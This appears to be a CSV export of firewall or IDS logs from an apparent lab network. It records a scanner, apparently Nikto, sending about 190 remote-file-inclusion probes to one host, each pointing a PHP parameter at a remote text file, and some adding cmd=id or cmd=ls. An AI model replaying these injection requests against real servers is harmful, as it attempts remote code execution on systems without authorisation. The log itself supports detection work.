ID_regla,sessionid,repeatcnt,severity_number,Nombre_regla,thread_category,prot,src_ip,dst_ip,log_subtype,extra_data
9999,415463,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/modules/groupadm/index.php?full_path=http://cirt.net/rfiinc.txt?
9999,415463,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/modules/groups/headerfile.php?system[path]=http://cirt.net/rfiinc.txt?
9999,415463,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/modules/guestbook/index.php?CONFIG[local_root]=http://cirt.net/rfiinc.txt??
9999,415463,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/modules/history/index.php?full_path=http://cirt.net/rfiinc.txt?
9999,415463,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/modules/home.module.php?repmod=http://cirt.net/rfiinc.txt??
9999,415463,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/modules/horoscope/footer.php?xoopsConfig[root_path]=http://cirt.net/rfiinc.txt?
9999,415463,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/modules/icontent/include/wysiwyg/spaw_control.class.php?spaw_root=http://cirt.net/rfiinc.txt?
9999,415463,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/modules/info/index.php?full_path=http://cirt.net/rfiinc.txt?
9999,415463,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/modules/links/blocks/links.php?system[path]=http://cirt.net/rfiinc.txt?
9999,415463,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/modules/links/showlinks.php?language_home=&rootdp=zZz&gsLanguage=http://cirt.net/rfiinc.txt?
9999,415463,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/modules/links/submit_links.php?rootdp=zZz&gsLanguage=http://cirt.net/rfiinc.txt?
9999,415463,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/modules/log/index.php?full_path=http://cirt.net/rfiinc.txt?
9999,415463,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/modules/mail/index.php?full_path=http://cirt.net/rfiinc.txt?
9999,415463,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/modules/menu/headerfile.php?system[path]=http://cirt.net/rfiinc.txt?
9999,415463,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/modules/messages/index.php?full_path=http://cirt.net/rfiinc.txt?
9999,415463,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/modules/mod_as_category.php?mosConfig_absolute_path=http://cirt.net/rfiinc.txt?
9999,415463,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/modules/mod_as_category/mod_as_category.php?mosConfig_absolute_path=http://cirt.net/rfiinc.txt?
9999,415463,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/modules/mod_calendar.php?absolute_path=http://cirt.net/rfiinc.txt?
9999,415463,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/modules/mod_flatmenu.php?mosConfig_absolute_path=http://cirt.net/rfiinc.txt?
32190,415449,3,3,MiniBB Forum absolute_path Parameter PHP File Include,code-execution,tcp,172.16.1.2,172.16.2.2,vulnerability,172.16.2.2/components/com_minibb.php?absolute_path=http://cirt.net/rfiinc.txt?
9999,415463,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/modules/mod_mainmenu.php?mosConfig_absolute_path=http://cirt.net/rfiinc.txt?
9999,415463,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/modules/mod_weather.php?absolute_path=http://cirt.net/rfiinc.txt?
9999,415463,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/modules/mod_weather.php?absolute_path=http://cirt.net/rfiinc.txt??
9999,415463,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/modules/mx_smartor/admin/admin_album_otf.php?phpbb_root_path=http://cirt.net/rfiinc.txt?
9999,415463,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/modules/mx_smartor/admin/admin_album_otf.php?phpbb_root_path=http://cirt.net/rfiinc.txt??
9999,415463,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/modules/newbb_plus/config.php?bbPath[root_theme]=http://cirt.net/rfiinc.txt?
9999,415463,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/modules/newbb_plus/votepolls.php?bbPath[path]=http://cirt.net/rfiinc.txt?
9999,415463,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/modules/news/blocks/latest_news.php?system[path]=http://cirt.net/rfiinc.txt?
9999,415463,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/modules/newusergreatings/pm_newreg.php?exbb[home_path]=http://cirt.net/rfiinc.txt??
9999,415463,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/modules/organizations/index.php?full_path=http://cirt.net/rfiinc.txt?
9999,415463,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/modules/phones/index.php?full_path=http://cirt.net/rfiinc.txt?
9999,415463,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/modules/pms/index.php?module_path=http://cirt.net/rfiinc.txt????
9999,415463,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/modules/poll/inlinepoll.php?language_home=&rootdp=zZz&gsLanguage=http://cirt.net/rfiinc.txt?
9999,415463,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/modules/poll/showpoll.php?language_home=&rootdp=zZz&gsLanguage=http://cirt.net/rfiinc.txt?
9999,415463,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/modules/postguestbook/styles/internal/header.php?tpl_pgb_moddir=http://cirt.net/rfiinc.txt??
9999,415463,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/modules/presence/index.php?full_path=http://cirt.net/rfiinc.txt?
9999,415463,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/modules/projects/index.php?full_path=http://cirt.net/rfiinc.txt?
9999,415463,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/modules/projects/list.php?full_path=http://cirt.net/rfiinc.txt?
9999,415463,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/modules/projects/summary.inc.php?full_path=http://cirt.net/rfiinc.txt?
9999,415463,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/modules/punish/p_error.php?exbb[home_path]=http://cirt.net/rfiinc.txt??
9999,415463,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/modules/punish/profile.php?exbb[home_path]=http://cirt.net/rfiinc.txt??
9999,415463,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/modules/reports/index.php?full_path=http://cirt.net/rfiinc.txt?
9999,415463,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/modules/search/index.php?full_path=http://cirt.net/rfiinc.txt?
9999,415463,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/modules/search/search.php?language_home=&rootdp=zZz&gsLanguage=http://cirt.net/rfiinc.txt?
9999,415463,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/modules/search/search.php?language_home=&rootdp=zZz&gsLanguage=http://cirt.net/rfiinc.txt??
9999,415463,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/modules/settings/headerfile.php?system[path]=http://cirt.net/rfiinc.txt?
9999,415463,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/modules/snf/index.php?full_path=http://cirt.net/rfiinc.txt?
9999,415463,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/modules/syslog/index.php?full_path=http://cirt.net/rfiinc.txt?
9999,415463,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/modules/tasks/index.php?full_path=http://cirt.net/rfiinc.txt?
9999,415463,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/modules/tasks/searchsimilar.php?full_path=http://cirt.net/rfiinc.txt?
9999,415463,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/modules/tasks/summary.inc.php?full_path=http://cirt.net/rfiinc.txt?
9999,415463,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/modules/threadstop/threadstop.php?exbb[home_path]=http://cirt.net/rfiinc.txt??
9999,415463,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/modules/tinycontent/admin/spaw/spaw_control.class.php?spaw_root=http://cirt.net/rfiinc.txt?
9999,415463,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/modules/tml/block.tag.php?GLOBALS[PTH][classes]=http://cirt.net/rfiinc.txt?
9999,415463,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/modules/tsdisplay4xoops/blocks/tsdisplay4xoops_block2.php?xoops_url=http://cirt.net/rfiinc.txt?
9999,415463,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/modules/useradm/index.php?full_path=http://cirt.net/rfiinc.txt?
9999,415463,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/modules/users/headerfile.php?system[path]=http://cirt.net/rfiinc.txt?
9999,415463,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/modules/vWar_Account/includes/functions_common.php?vwar_root2=http://cirt.net/rfiinc.txt?
9999,415463,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/modules/visitors2/include/config.inc.php?lvc_include_dir=http://cirt.net/rfiinc.txt??
9999,415463,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/modules/vwar/convert/mvcw_conver.php?step=1&vwar_root=http://cirt.net/rfiinc.txt?
9999,415463,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/modules/wiwimod/spaw/spaw_control.class.php?spaw_root=http://cirt.net/rfiinc.txt?
9999,415463,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/modules/xfsection/modify.php?dir_module=http://cirt.net/rfiinc.txt?
9999,415463,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/modules/xgallery/upgrade_album.php?GALLERY_BASEDIR=http://cirt.net/rfiinc.txt?
9999,415463,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/modules/xt_conteudo/admin/spaw/spaw_control.class.php?spaw_root=http://cirt.net/rfiinc.txt?
9999,415463,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/modules/xt_conteudo/admin/spaw/spaw_control.class.php?spaw_root=http://cirt.net/rfiinc.txt??
9999,415463,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/modulistica/mdl_save.php?CLASSPATH=http://cirt.net/rfiinc.txt?
9999,415463,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/modx-0.9.6.2/assets/snippets/reflect/snippet.reflect.php?reflect_base=http://cirt.net/rfiinc.txt??
9999,415463,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/moodle/admin/utfdbmigrate.php?cmd=http://cirt.net/rfiinc.txt?
9999,415463,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/moosegallery/display.php?type=http://cirt.net/rfiinc.txt??&cmd=[command]
9999,415463,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/mostlyce/jscripts/tiny_mce/plugins/htmltemplate/htmltemplate.php?mosConfig_absolute_path=http://cirt.net/rfiinc.txt?
9999,415463,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/moteur/moteur.php?chemin=http://cirt.net/rfiinc.txt??
9999,415463,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/movie_cls.php?full_path=http://cirt.net/rfiinc.txt?
9999,415463,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/msDb.php?GLOBALS[ini_array][EXTLIB_PATH]=http://cirt.net/rfiinc.txt?
9999,415463,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/music/buycd.php?HTTP_DOCUMENT_ROOT=http://cirt.net/rfiinc.txt??
9999,415463,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/mutant_includes/mutant_functions.php?phpbb_root_path=http://cirt.net/rfiinc.txt?
9999,415463,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/mxBB/modules/kb_mods/includes/kb_constants.php?module_root_path=http://cirt.net/rfiinc.txt?
9999,415463,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/mxBB/modules/mx_newssuite/includes/newssuite_constants.php?mx_root_path=http://cirt.net/rfiinc.txt?
9999,415463,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/mygallery/myfunctions/mygallerybrowser.php?myPath=http://cirt.net/rfiinc.txt?
9999,415463,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/myphpcommander_path/system/lib/package.php?gl_root=http://cirt.net/rfiinc.txt??cmd
9999,415463,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/mysave.php?file=http://cirt.net/rfiinc.txt?
9999,415463,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/naboard_pnr.php?skin=http://cirt.net/rfiinc.txt??
9999,415463,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/ncaster/admin/addons/archive/archive.php?adminfolder=http://cirt.net/rfiinc.txt?
9999,415463,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/network_module_selector.php?path_prefix=http://cirt.net/rfiinc.txt?
9999,415463,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/news.php?CONFIG[script_path]=http://cirt.net/rfiinc.txt??
9999,415463,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/news.php?config[root_ordner]=http://cirt.net/rfiinc.txt??&cmd=id
9999,415463,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/news.php?scriptpath=http://cirt.net/rfiinc.txt??
9999,415463,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/news.php?vwar_root=http://cirt.net/rfiinc.txt?
9999,415463,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/news.php?vwar_root=http://cirt.net/rfiinc.txt??&cmd=ls
9999,415463,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/news/include/createdb.php?langfile;=http://cirt.net/rfiinc.txt??
9999,415463,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/news/include/customize.php?l=http://cirt.net/rfiinc.txt??
9999,415463,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/news/newstopic_inc.php?indir=http://cirt.net/rfiinc.txt?
9999,415463,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/news/scripts/news_page.php?script_path=http://cirt.net/rfiinc.txt??
9999,415463,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/newsadmin.php?action=http://cirt.net/rfiinc.txt?
9999,415463,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/newsarchive.php?path_to_script=http://cirt.net/rfiinc.txt??&cmd=ls
9999,415463,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/newsfeeds/includes/aggregator.php?zf_path=http://cirt.net/rfiinc.txt?
9999,415463,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/newsfeeds/includes/controller.php?zf_path=http://cirt.net/rfiinc.txt?
9999,415463,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/newsletter/newsletter.php?waroot=http://cirt.net/rfiinc.txt?
9999,415463,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/newsp/lib/class.Database.php?path=http://cirt.net/rfiinc.txt??
9999,415463,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/newticket.php?lang=http://cirt.net/rfiinc.txt?
9999,415463,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/noah/modules/noevents/templates/mfa_theme.php?tpls[1]=http://cirt.net/rfiinc.txt?
9999,415464,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/noticias.php?inc=http://cirt.net/rfiinc.txt??
9999,415464,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/nucleus/plugins/skinfiles/index.php?DIR_LIBS=http://cirt.net/rfiinc.txt?
9999,415464,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/nuke_path/iframe.php?file=http://cirt.net/rfiinc.txt?
9999,415464,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/nukebrowser.php?filnavn=http://cirt.net/rfiinc.txt?&filhead=XXpathXX&cmd=id
9999,415464,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/nuseo/admin/nuseo_admin_d.php?nuseo_dir=http://cirt.net/rfiinc.txt?
9999,415464,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/nuseo/admin/nuseo_admin_d.php?nuseo_dir=http://cirt.net/rfiinc.txt??
9999,415464,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/oaboard_en/forum.php?inc=http://cirt.net/rfiinc.txt?
9999,415464,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/ocp-103/index.php?req_path=http://cirt.net/rfiinc.txt?
9999,415464,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/ocs/include/footer.inc.php?fullpath=http://cirt.net/rfiinc.txt??
9999,415464,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/ocs/include/theme.inc.php?fullpath=http://cirt.net/rfiinc.txt??
9999,415464,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/ocs/openemr-2.8.2/custom/import_xml.php?srcdir=http://cirt.net/rfiinc.txt??
9999,415464,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/olbookmarks-0.7.4/themes/test1.php?http://cirt.net/rfiinc.txt?
9999,415464,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/oneadmin/adminfoot.php?path[docroot]=http://cirt.net/rfiinc.txt?
9999,415464,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/oneadmin/blogger/sampleblogger.php?path[docroot]=http://cirt.net/rfiinc.txt??
9999,415464,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/oneadmin/config-bak.php?include_once=http://cirt.net/rfiinc.txt?
9999,415464,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/oneadmin/config.php?path[docroot]=http://cirt.net/rfiinc.txt?
9999,415464,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/oneadmin/ecommerce/sampleecommerce.php?path[docroot]=http://cirt.net/rfiinc.txt??
9999,415464,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/online.php?config[root_ordner]=http://cirt.net/rfiinc.txt??&cmd=id
9999,415464,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/open-admin/plugins/site_protection/index.php?config[oi_dir]=http://cirt.net/rfiinc.txt??
9999,415464,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/openi-admin/base/fileloader.php?config[openi_dir]=http://cirt.net/rfiinc.txt?
9999,415464,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/openrat/themes/default/include/html/insert.inc.php?tpl_dir=http://cirt.net/rfiinc.txt????
9999,415464,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/opensurveypilot/administration/user/lib/group.inc.php?cfgPathToProjectAdmin=http://cirt.net/rfiinc.txt?
9999,415464,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/ops/gals.php?news_file=http://cirt.net/rfiinc.txt?
9999,415464,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/order/login.php?svr_rootscript=http://cirt.net/rfiinc.txt?
9999,415464,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/osData/php121/php121db.php?php121dir=http://cirt.net/rfiinc.txt?
9999,415464,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/ossigeno-suite-2.2_pre1/upload/xax/admin/modules/uninstall_module.php?level=http://cirt.net/rfiinc.txt??
9999,415464,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/ossigeno_modules/ossigeno-catalogo/xax/ossigeno/catalogo/common.php?ossigeno=http://cirt.net/rfiinc.txt??
9999,415464,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/owimg.php3?path=http://cirt.net/rfiinc.txt?
9999,415464,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/p-news.php?pn_lang=http://cirt.net/rfiinc.txt?
9999,415464,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/pafiledb/includes/pafiledb_constants.php?module_root_path=http://cirt.net/rfiinc.txt?
9999,415464,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/page.php?goto=http://cirt.net/rfiinc.txt?
9999,415464,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/page.php?id=http://cirt.net/rfiinc.txt?
9999,415464,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/panel/common/theme/default/header_setup.php?path[docroot]=http://cirt.net/rfiinc.txt?
9999,415464,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/param_editor.php?folder=http://cirt.net/rfiinc.txt??
9999,415464,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/parse/parser.php?WN_BASEDIR=http://cirt.net/rfiinc.txt?
9999,415464,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/patch/?language_id=http://cirt.net/rfiinc.txt?
9999,415464,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/patch/tools/send_reminders.php?noSet=0&includedir=http://cirt.net/rfiinc.txt??
9999,415464,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/paypalipn/ipnprocess.php?INC=http://cirt.net/rfiinc.txt??
9999,415464,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/pda/pda_projects.php?offset=http://cirt.net/rfiinc.txt?
9999,415464,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/phfito/phfito-post?SRC_PATH=http://cirt.net/rfiinc.txt?
9999,415464,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/phorum/plugin/replace/plugin.php?PHORUM[settings_dir]=http://cirt.net/rfiinc.txt?
9999,415464,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/photo_comment.php?toroot=http://cirt.net/rfiinc.txt?
9999,415464,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/php-inc/log.inc.php?SKIN_URL=http://cirt.net/rfiinc.txt?
9999,415464,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/php-include-robotsservices.php?page=http://cirt.net/rfiinc.txt?
9999,415464,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/php-nuke/modules/Forums/admin/admin_styles.php?phpbb_root_path=http://cirt.net/rfiinc.txt?
9999,415464,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/php.incs/common.inc.php?cm_basedir=http://cirt.net/rfiinc.txt??
9999,415464,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/php/init.gallery.php?include_class=http://cirt.net/rfiinc.txt?/something
9999,415464,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/php121db.php?php121dir=http://cirt.net/rfiinc.txt?
9999,415464,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/php4you.php?dir=http://cirt.net/rfiinc.txt??
9999,415464,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/phpAdsNew-2.0.7/libraries/lib-remotehost.inc?phpAds_geoPlugin=http://cirt.net/rfiinc.txt??
9999,415464,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/phpBB2/shoutbox.php?phpbb_root_path=http://cirt.net/rfiinc.txt?
9999,415464,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/phpCards.header.php?CardPath=http://cirt.net/rfiinc.txt??
9999,415464,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/phpGedView/help_text_vars.php?cmd=dir&PGV_BASE_DIRECTORY=http://cirt.net/rfiinc.txt?
9999,415464,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/phpMyChat.php3?=http://cirt.net/rfiinc.txt??cmd=id
9999,415464,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/phpMyConferences_8.0.2/common/visiteurs/include/menus.inc.php?lvc_include_dir=http://cirt.net/rfiinc.txt??
9999,415464,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/phpQLAdmin-2.2.7/ezmlm.php?_SESSION[path]=http://cirt.net/rfiinc.txt??
9999,415464,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/phpSiteBackup-0.1/pcltar.lib.php?g_pcltar_lib_dir=http://cirt.net/rfiinc.txt?
9999,415464,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/phpbb/sendmsg.php?phpbb_root_path=http://cirt.net/rfiinc.txt?
9999,415464,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/phpcalendar/includes/calendar.php?phpc_root_path=http://cirt.net/rfiinc.txt??
9999,415464,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/phpcalendar/includes/setup.php?phpc_root_path=http://cirt.net/rfiinc.txt??
9999,415464,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/phpdebug_PATH/test/debug_test.php?debugClassLocation=http://cirt.net/rfiinc.txt?
9999,415464,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/phpffl/phpffl_webfiles/program_files/livedraft/admin.php?PHPFFL_FILE_ROOT=http://cirt.net/rfiinc.txt?
9999,415464,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/phpffl/phpffl_webfiles/program_files/livedraft/livedraft.php?PHPFFL_FILE_ROOT=http://cirt.net/rfiinc.txt?
